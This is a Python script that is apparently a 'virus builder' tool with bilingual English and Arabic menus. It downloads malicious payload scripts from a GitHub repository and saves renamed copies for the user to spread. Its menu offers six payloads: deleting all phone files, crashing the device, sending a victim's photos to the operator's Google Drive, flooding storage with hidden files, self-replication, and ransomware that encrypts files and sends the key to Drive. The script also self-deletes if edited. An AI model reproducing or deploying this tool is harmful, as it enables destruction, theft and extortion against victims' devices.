import os, sys
from time import sleep
import subprocess
import hashlib
asci =('''
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⣠⠎⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣖⡉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣄⣀⣠⣤⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⣿⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀
⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀
⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀
⠠⣾⣿⢿⣿⣿⣿⣿⡿⠁⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⠉⠀⠀
⠀⠀⠀⢸⣿⣿⣿⡿⠑⠊⣿⣿⡿⠿⠛⠛⠙⠛⣻⣿⣿⣄⡻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀
⠀⠀⠀⢸⣿⣿⣿⡗⠾⠛⠉⠉⠀⠀⠀⠀⠀⠀⠈⠉⠉⠙⠛⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀
⠀⠀⠀⢸⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠟⠛⠻⣿⣿⣿⣿⣿⣿⡄⠀
⠀⠀⠀⠀⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⢶⡋⠳⢸⣿⣿⣿⣿⣿⣇⠀
⠀⠂⠀⠀⠘⣿⣿⣿⡀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡗⠚⢁⣠⣾⣿⣿⣿⣿⣿⣿⠀
⠀⠉⠀⠀⠀⠈⣻⣿⣿⣦⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣷⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⠀⠀⠀⢺⣿⠤⠿⢿⣿⣿⣿⣿⣿⣿⣷⣶⡄⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⢿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⣀⡠⠜⠋⠁⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡿⠛⣠⣟⣁⠤⠖⠋⠁⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀
⠀⠀⠀⠀⠀⠀⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡟⢸⠿⠃⠀
⠀⠀⠀⠀⠀⠀⢸⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢦⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣆⠀⠀⠀⠀⠀⠀''')
def ascii():
	G = ('\033[92m')
	R = ('\033[31m')
	print('''\033[31m
        	uuuuuuu
             uu$$$$$$$$$$$uu
          uu$$$$$$$$$$$$$$$$$uu
         u$$$$$$$$$$$$$$$$$$$$$u
        u$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$"   "$$$"   "$$$$$$u
       "$$$$"      u$u       $$$$"
        $$$u       u$u       u$$$
        $$$u      u$$$u      u$$$
         "$$$$uu$$$   $$$uu$$$$"
          "$$$$$$$"   "$$$$$$$"
            u$$$$$$$u$$$$$$$u
             u$"$"$"$"$"$"$u
  uuu        $$u$ $ $ $ $u$$       uuu
 u$$$$        $$$$$u$u$u$$$       u$$$$
  $$$$$uu      "$$$$$$$$$"     uu$$$$$$      '''+G+'''Done!!!'''+R+'''
u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
 """      ""$$$$$$$$$$$uu ""$"""
           uuuu ""$$$$$$$$$$uuu
  u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
  $$$$$$$$$$""""           ""$$$$$$$$$$$"
   "$$$$$"                      ""$$$$""
     $$$"                         $$$$"''')

R = ('\033[31m')
W = ("\033[97m")
import os

va = ['.Open.py', '.config_virus.py', '.spreading_virus.py', '.delet_virus.py', '.crash_virus.py','.encrypted_virus.py','.decrypted_virus.py']
print(W+'''
	.____.
   xuu$``$$$uuu.
 . $``$  $$$`$$$
dP*$  $  $$$ $$$
?k $  $  $$$ $$$
 $ $  $  $$$ $$$
 ":$  $  $$$ $$$
  N$  $  $$$ $$$
  $$  $  $$$ $$$
   $  $  $$$ $$$
   $  $  $$$ $$$
   $  $  $$$ $$$
   $  $  $$$ $$$
   $  $  $$$ $$$
   $$#$  $$$ $$$
   $$'$  $$$ $$$
   $$`R  $$$ $$$      '''+R+'''__     ___                 '''+W+'''
   $$$&  $$$ $$$      '''+R+'''\ \   / (_)_ __ _   _ ___   _ __  _   _'''+W+'''
   $#*$  $$$ $$$      '''+R+''' \ \ / /| | '__| | | / __| | '_ \| | | |'''+W+'''
   $  $  $$$ @$$      '''+R+'''  \ V / | | |  | |_| \__ \_| |_) | |_| |'''+W+'''
   $  $  $$$ $$$      '''+R+'''   \_/  |_|_|   \__,_|___(_) .__/ \__, |'''+W+'''
   $  $  $$$ $$$      '''+R+'''                           |_|    |___/'''+W+'''
   $  $  $B$ $$&.
   $  $  $D$ $$$$$muL.
   $  $  $Q$ $$$$$  `"**mu..
   $  $  $R$ $$$$$    k  `$$*t
   $  @  $$$ $$$$$    k   $$!4
   $ x$uu@B8u$NB@$uuuu6...$$X?
   $ $(`RF`$`````R$ $$5`"""#"R
   $ $" M$ $     $$ $$$      ?
   $ $  ?$ $     T$ $$$      $
   $ $F H$ $     M$ $$K      $  ..
   $ $L $$ $     $$ $$R.     "d$$$$Ns.
   $ $~ $$ $     N$ $$X      ."    "%2h
   $ 4k f  $     *$ $$&      R       "iN
   $ $$ %uz!     tuuR$$:     Buu      ?`:
   $ $F          $??$8B      | '*Ned*$~L$
   $ $k          $'@$$$      |$.suu+!' !$
   $ ?N          $'$$@$      $*`      d:"
   $ dL..........M.$&$$      5       d"P
 ..$.^"*I$RR*$C""??77*?      "nu...n*L*
'$C"R   ``""!$*@#""` .uor    bu8BUU+!`
'*@m@.       *d"     *$Rouxxd"```$
     R*@mu.           "#$R *$    !
     *%x. "*L               $     %.
        "N  `%.      ...u.d!` ..ue$$$o..
         @    ".    $*"""" .u$$$$$$$$$$$$beu...
        8  .mL %  :R`     x$$$$$$$$$$$$$$$$$$$$$$$$$$WmeemeeWc
       |$e!" "s:k 4      d$N"`"#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$>
       $$      "N @      $?$    F$$$$$$$$$$$$$$$$$$$$$$$$$$$$>
       $@       ^%Uu..   R#8buu$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$>
                  ```""*u$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$>
                         #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$>
                          "5$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$>
                            `*$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$>
                              ^#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$>
                                 "*$$$$$$$$$$$$$$$$$$$$$$$$$$>
                                   `"*$$$$$$$$$$$$$$$$$$$$$$$>
                                       ^!$$$$$$$$$$$$$$$$$$$$>
                                           `"#+$$$$$$$$$$$$$$>
                                                 ""**$$$$$$$$>
                                                        ''')
def check_for_modifications():
    script_path = os.path.abspath(__file__)

    with open(script_path, 'rb') as f:
        current_script_hash = hashlib.md5(f.read()).hexdigest()
    stored_hash_path = os.path.join(os.path.dirname(script_path), '.root.txt')
    if not os.path.isfile(stored_hash_path):
        with open(stored_hash_path, "w") as f:
            f.write(current_script_hash)
    else:
        with open(stored_hash_path) as f:
            stored_script_hash = f.read()

        if current_script_hash != stored_script_hash:

            os.remove(script_path)
            for file_name in va:
            	if os.path.isfile(file_name):
            		os.remove(file_name)
            exit()

    with open(stored_hash_path, 'w') as f:
        f.write(current_script_hash)
check_for_modifications()
def op():
	
	try:
	    import webbrowser,wget,requests
	except ImportError:
	    os.system('pip3 install webbrowser')
	    os.system('pip3 install wget')
	    os.system('pip3 install requests')
	    import webbrowser,wget,requests

	url = 'https://raw.githubusercontent.com/Kitt-loy/Virus-Py/main/1.9v'
	
	
	response = requests.get(url)
	version_number = url.split("/")[-1]
	if __name__ == '__main__':
		    with open(__file__) as f:
		        content = f.read()
		    if response.status_code != 200:
		        	print('    This script is outdated. Please update it to version', version_number)
		        	os.remove(__file__)
		        	exit()
	words = "\033[34m     𝚃𝙷𝙸𝚂 𝚃𝙾𝙾𝙻 𝙸𝚂 𝙵𝙾𝚁 𝙼𝙰𝙺𝙴 𝙿𝚈𝚃𝙷𝙾𝙽 𝚅𝙸𝚁𝚄𝚂 \n\n"
	words_ar = "\033[92m هذه الأداة لصنع فيروسات على هيئة سكربتات بايثون     \n\n"
	vers = ('\033[34m       Virus-Scripts version '+version_number+'\n')
	#print(response.content)
	print(vers)
	
	for char in words:
		    sleep(0.1)
		    sys.stdout.write(char)
		    sys.stdout.flush()
	for char in words_ar:
		    sleep(0)
		    sys.stdout.write(char)
		    sys.stdout.flush()
	
	def run():
		import os
		import wget
		
		base_url = 'https://raw.githubusercontent.com/Kitt-loy/Virus-Py/main/'
		va = ['.Open.py', '.config_virus.py', '.spreading_virus.py', '.delet_virus.py', '.crash_virus.py','.encrypted_virus.py','.decrypted_virus.py']
		
		for file_name in va:
		    file_path = os.path.join(os.getcwd(), file_name)
		    if not os.path.exists(file_path):
		        url = base_url + file_name
		        wget.download(url)
		        print('')
		import os
		R = ('\033[31m')
		BLUE = ("\033[34m")
		W = ("\033[97m")
		G = ('\033[92m')
		LIGHTGREEN_EX = ('\033[92m')
	#	print('\n')
		print(R+'《0》'+W+'Exit')
		print(R+'《1》'+W+'The first virus deletes all phone files, including photos, audios, and others')
		print(R+'《2》'+W+'The virus cash the device and puts pressure on the device processor')
		print(R+'《3》'+W+"This virus steals all the victim's photos and sends them to your google drive (but you need token for google drive)")
		print(R+'《4》'+W+'This virus creates insanely hidden files in the sdcard really fast')
		print(R+'《5》'+W+'This virus copies itself over and over again inside file scripts such as text, etc')
		print(R+'《6》'+W+'The virus encrypts all phone files with a password that you specify, and the password is saved in the Password.txt file, and the Password.txt file is sent to your account on Google Drive')
		print(G+'《0》'+W+ 'إلغاء')
		print(G+'《1》'+W+'يقوم الفيروس الأول بحذف جميع ملفات الهاتف ، بما في ذلك الصور والتسجيلات الصوتية وغيرها')
		print(G+'《2》'+W+'يقوم الفيروس بالضغط على الجهاز ويعلقه ويضغط على معالج الجهاز')
		print(G+'《3》'+W+"يسرق هذا الفيروس جميع صور الضحايا ويرسلها إلى حسابك على google drive  (لكنك تحتاج إلى الـtoken لـ google drive الخاص بك)")
		print(G+'《4》'+W+'يقوم هذا الفيروس بإنشاء ملفات مخفية بسرعة كبيرة ولا يمكن للضحية رؤيتها')
		print(G+'《5》'+W+'يقوم هذا الفايروس بنسح نفسه مراراً وتكراراً بداخل سكربتات الملفات مثل النصوص او وغيرها')
		print(G+'《6》'+W+'يقوم الفايروس بتشفير جميع ملفات الهاتف ب باسوورد انت تقوم بتحديده ويتم حفظ الباسورد بملف Password.txt ويتم إرسال ملف Password.txt لحسابك على Google Drive ')
		Virus00=str(input("\033[31m ┌─["+LIGHTGREEN_EX+"𝘾𝙃𝙊𝙊𝙎𝙀 𝙏𝙃𝙀  "+BLUE+"~"+R+"@"+W+"𝙑𝙄𝙍𝙐𝙎 𝙔𝙊𝙐 𝙒𝘼𝙉𝙏 "+R+"""]
 └──╼ """+W+"$ "))
		if not Virus00.isdigit() or int(Virus00) not in [1, 2, 3, 4, 5, 6, 0]:
			    os.system('clear')
			    print('The character you entered does not exist. Please choose from the following numbers:\n0\n1\n2\n3\n4\n5\n6')
			    print('الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الارقام التالية:\n0\n1\n2\n3\n4\n5\n6')
			    run()
		if Virus00 == "0":
				def ho():
				    import os
				    os.system('clear')
				    try:
				        import pyfiglet
				        from termcolor import colored
				    except ModuleNotFoundError:
				        os.system("pip install pyfiglet termcolor")
				        import pyfiglet
				        from termcolor import colored
				    colored_asci = colored(asci, "white", "on_red", attrs=["bold"])
				    text = pyfiglet.figlet_format("     BYE", font="big")				
				    print(colored_asci)
				    print(text)
				ho()
		if Virus00 == "1":
				BLUE = ("\033[34m")
				GREN = ('\033[92m')
				White = ("\033[97m")
				RED = ("\033[31m")
				LIGHTGREEN_EX = ('\033[92m')
				import shutil	
				Open = r'.delet_virus.py'
				Open1 = r'.delet_virus1.py'
				shutil.copyfile(Open, Open1)
				new = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]
 └──╼ """+White+"$ ")
				
				############
				old_name = r".delet_virus.py"
				new_name = (new + '.py')
				#############
				os.rename(old_name, new_name)
				########
				ascii()
				print(White+'The virus has been saved as ' +RED+ new + '.py')
				import os
				original = r'.delet_virus1.py'
				target = r'.delet_virus.py'
				os.rename(original, target)
				def restart():
				    while True:
				        import os
				        restart = input("\033[31m ┌─["+LIGHTGREEN_EX+"Do You Want"+BLUE+"~"+RED+"@"+White+"Back"+RED+"""]
 └──╼  """+White+"(y/n) ? ")
				        if restart == "y":
				            import os
				            os.system('clear')
				            run()
				          #  break
				        elif restart == "n":
				            exit()
				        else:
				            os.system('clear')
				            print('The character you entered does not exist. Please choose :\ny\nor\nn')
				            print('الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn')
				restart()
			########
			##Virus2##
			########
		if Virus00 == "2":
				BLUE = ("\033[34m")
				GREN = ('\033[92m')
				White = ("\033[97m")
				RED = ("\033[31m")
				LIGHTGREEN_EX = ('\033[92m')
				import shutil	
				Open = r'.crash_virus.py'
				Open1 = r'.crash_virus1.py'
				shutil.copyfile(Open, Open1)
				new = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]
 └──╼ """+White+"$ ")
				
				############
				old_name = r".crash_virus.py"
				new_name = (new + '.py')
				#############
				os.rename(old_name, new_name)
				########
				ascii()
				print(White+'The virus has been saved as ' +RED+ new + '.py')
				import os
				original = r'.crash_virus1.py'
				target = r'.crash_virus.py'
				os.rename(original, target)
				def restart():
				    while True:
				        import os
				        restart = input("\033[31m ┌─["+LIGHTGREEN_EX+"Do You Want"+BLUE+"~"+RED+"@"+White+"Back"+RED+"""]
 └──╼  """+White+"(y/n) ? ")
				        if restart == "y":
				            import os
				            os.system('clear')
				            run()
				          #  break
				        elif restart == "n":
				            exit()
				        else:
				            os.system('clear')
				            print('The character you entered does not exist. Please choose :\ny\nor\nn')
				            print('الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn')
				restart()
		if Virus00 == "3":
				BLUE = ("\033[34m")
				GREN = ('\033[92m')
				White = ("\033[97m")
				RED = ("\033[31m")
				LIGHTGREEN_EX = ('\033[92m')
				import shutil	
				Open = r'.Open.py'
				Open1 = r'.Open1.py'
				shutil.copyfile(Open, Open1)
				import webbrowser
				url = 'https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?redirect_uri=https%3A%2F%2Fdevelopers.google.com%2Foauthplayground&prompt=consent&response_type=code&client_id=407408718192.apps.googleusercontent.com&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive&access_type=offline&service=lso&o2v=2&flowName=GeneralOAuthFlow'
				webbrowser.open(url)
				print(RED+'You Can found your Google Drive token Here👇/يمكنك العثور على رمز التوكن الخاص بحسابك على جوجل درايف هنا\n')
				print('https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?redirect_uri=https%3A%2F%2Fdevelopers.google.com%2Foauthplayground&prompt=consent&response_type=code&client_id=407408718192.apps.googleusercontent.com&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive&access_type=offline&service=lso&o2v=2&flowName=GeneralOAuthFlow\n')
				nun = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"Google Drive Code"+RED+"""]
 └──╼ """+White+"$ ")
				new = input(GREN+'The File name: ')
				############
				with open('.Open.py', 'r') as file :
				  filedata = file.read()
				
				##########
				filedata = filedata.replace('abcde', nun)
				filedata = filedata.replace('mvvv.py', new)
				#########
				with open('.Open.py', 'w') as file:
				  file.write(filedata)
				 ########
				old_name = r".Open.py"
				new_name = (new + '.py')
				#############
				os.rename(old_name, new_name)
				########
				ascii()
				print(White+'The virus has been saved as ' +RED+ new + '.py')
				import os
				original = r'.Open1.py'
				target = r'.Open.py'
				os.rename(original, target)
				def restart():
				    while True:
				        import os
				        restart = input("\033[31m ┌─["+LIGHTGREEN_EX+"Do You Want"+BLUE+"~"+RED+"@"+White+"Back"+RED+"""]
 └──╼  """+White+"(y/n) ? ")
				        if restart == "y":
				            import os
				            os.system('clear')
				            run()
				          #  break
				        elif restart == "n":
				            exit()
				        else:
				            os.system('clear')
				            print('The character you entered does not exist. Please choose :\ny\nor\nn')
				            print('الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn')
				restart()
		if Virus00 == "4":
				BLUE = ("\033[34m")
				GREN = ('\033[92m')
				White = ("\033[97m")
				RED = ("\033[31m")
				LIGHTGREEN_EX = ('\033[92m')
				import shutil	
				Open = r'.config_virus.py'
				Open1 = r'.config_virus1.py'
				shutil.copyfile(Open, Open1)
				new = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]
 └──╼ """+White+"$ ")
				
				############
				old_name = r".config_virus.py"
				new_name = (new + '.py')
				#############
				os.rename(old_name, new_name)
				########
				ascii()
				print(White+'The virus has been saved as ' +RED+ new + '.py')
				import os
				original = r'.config_virus1.py'
				target = r'.config_virus.py'
				os.rename(original, target)
				def restart():
				    while True:
				        import os
				        restart = input("\033[31m ┌─["+LIGHTGREEN_EX+"Do You Want"+BLUE+"~"+RED+"@"+White+"Back"+RED+"""]
 └──╼  """+White+"(y/n) ? ")
				        if restart == "y":
				            import os
				            os.system('clear')
				            run()
				          #  break
				        elif restart == "n":
				            exit()
				        else:
				            os.system('clear')
				            print('The character you entered does not exist. Please choose :\ny\nor\nn')
				            print('الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn')
				restart()
		if Virus00 == "5":
				BLUE = ("\033[34m")
				GREN = ('\033[92m')
				White = ("\033[97m")
				RED = ("\033[31m")
				LIGHTGREEN_EX = ('\033[92m')
				import shutil	
				Open = r'.spreading_virus.py'
				Open1 = r'.spreading_virus1.py'
				shutil.copyfile(Open, Open1)
				new = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]
 └──╼ """+White+"$ ")
				
				############
				old_name = r".spreading_virus.py"
				new_name = (new + '.py')
				#############
				os.rename(old_name, new_name)
				########
				ascii()
				print(White+'The virus has been saved as ' +RED+ new + '.py')
				original = r'.spreading_virus1.py'
				target = r'.spreading_vrius.py'
				os.rename(original, target)
				def restart():
				    while True:
				        import os
				        restart = input("\033[31m ┌─["+LIGHTGREEN_EX+"Do You Want"+BLUE+"~"+RED+"@"+White+"Back"+RED+"""]
 └──╼  """+White+"(y/n) ? ")
				        if restart == "y":
				            import os
				            os.system('clear')
				            run()
				          #  break
				        elif restart == "n":
				            exit()
				        else:
				            os.system('clear')
				            print('The character you entered does not exist. Please choose :\ny\nor\nn')
				            print('الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn')
				restart()
		if Virus00 == "6":
				BLUE = ("\033[34m")
				GREN = ('\033[92m')
				White = ("\033[97m")
				RED = ("\033[31m")
				LIGHTGREEN_EX = ('\033[92m')
				import shutil	
				Open = r'.encrypted_virus.py'
				Open1 = r'.encrypted_virus1.py'
				shutil.copyfile(Open, Open1)
				new = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]
 └──╼ """+White+"$ ")
				password = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"Password Encrypted"+RED+"""]
 └──╼ """+White+"$ ")
				import webbrowser
				url = 'https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?redirect_uri=https%3A%2F%2Fdevelopers.google.com%2Foauthplayground&prompt=consent&response_type=code&client_id=407408718192.apps.googleusercontent.com&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive&access_type=offline&service=lso&o2v=2&flowName=GeneralOAuthFlow'
				webbrowser.open(url)
				print(RED+'You Can found your Google Drive token Here👇/يمكنك العثور على رمز التوكن الخاص بحسابك على جوجل درايف هنا\n')
				print('https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?redirect_uri=https%3A%2F%2Fdevelopers.google.com%2Foauthplayground&prompt=consent&response_type=code&client_id=407408718192.apps.googleusercontent.com&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive&access_type=offline&service=lso&o2v=2&flowName=GeneralOAuthFlow\n')
				nun = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"Google Drive Code"+RED+"""]
 └──╼ """+White+"$ ")
 ###########################
 ##########Ecrypted##########
 ###########################
				with open('.encrypted_virus.py', 'r') as file :
					filedata = file.read()
					filedata = filedata.replace('abcde', nun)
					filedata = filedata.replace('passe', password)
				#########
				with open('.encrypted_virus.py', 'w') as file:
				 file.write(filedata)
				 ########
				 old_name = r".encrypted_virus.py"
				 new_name = (new + '.py')
				#############
				os.rename(old_name, new_name)
				############
				import os
				original = r'.encrypted_virus1.py'
				target = r'.encrypted_virus.py'
				os.rename(original, target)
 ###########################
 ##########Decrypted##########
 ###########################
				Open = r'.decrypted_virus.py'
				Open1 = r'.decrypted_virus1.py'
				shutil.copyfile(Open, Open1)
				 ########
				old_name = r".decrypted_virus.py"
				new_name = (new + '_decrypted.py')
				#############
				os.rename(old_name, new_name)
				############
				ascii()
				print(White+'The virus has been saved as ' +RED+ new + '.py')
				import os
				original = r'.decrypted_virus1.py'
				target = r'.decrypted_virus.py'
				os.rename(original, target)
#################################
				def restart():
				    while True:
				        import os
				        restart = input("\033[31m ┌─["+LIGHTGREEN_EX+"Do You Want"+BLUE+"~"+RED+"@"+White+"Back"+RED+"""]
 └──╼  """+White+"(y/n) ? ")
				        if restart == "y":
				            import os
				            os.system('clear')
				            run()
				          #  break
				        elif restart == "n":
				            exit()
				        else:
				            os.system('clear')
				            print('The character you entered does not exist. Please choose :\ny\nor\nn')
				            print('الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn')
				restart()
	run()
op()
